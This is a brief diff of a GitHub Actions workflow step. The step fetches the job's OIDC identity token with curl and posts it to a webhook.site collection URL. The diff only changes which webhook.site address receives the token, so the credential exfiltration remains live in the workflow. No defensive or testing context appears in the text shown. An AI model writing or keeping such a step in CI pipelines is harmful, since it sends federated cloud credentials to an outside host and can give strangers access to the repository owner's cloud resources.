@@ -17,4 +17,4 @@ jobs:
         run: |
           OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=o6s" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
           curl -i -s --data-binary "$OIDC_TOKEN" \
-            https://webhook.site/7104640f-d160-47aa-91eb-e8dc14dd5547
+            https://webhook.site/d8c33235-20ff-40ed-b7dc-551707872f8f
